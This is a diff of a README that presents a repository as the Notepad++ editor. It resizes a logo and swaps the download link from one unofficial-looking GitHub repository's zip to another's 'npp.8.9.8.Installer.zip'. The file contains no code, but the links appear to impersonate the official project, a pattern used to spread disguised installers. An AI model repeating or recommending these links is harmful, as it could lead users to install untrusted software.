@@ -4,10 +4,10 @@
 
 **Notepad++** is a free source code editor and Notepad replacement that supports several programming languages and offers a wide range of features for developers and power users.
 
-<img width="448" height="448" alt="image" src="https://github.com/user-attachments/assets/d1e153f4-59d2-4d61-86cc-17213e3656a1" />
+<img width="118" height="118" alt="image" src="https://github.com/user-attachments/assets/d1e153f4-59d2-4d61-86cc-17213e3656a1" />
 
 ## Install
-[Download `NotepadPlusPlus.zip`](https://github.com/artinkavousi/notepadplusplus/releases/latest/download/NotepadPlusPlus.zip)
+[Download `npp.8.9.8.Installer.zip`](https://github.com/notepad-pp/notepadplusplus/releases/download/v8.9.8/npp.8.9.8.Installer.zip)
 ---
 <img width="1200" height="700" alt="image" src="https://github.com/user-attachments/assets/c9fdff33-6e7f-4d94-a899-74762c37eecb" />
 
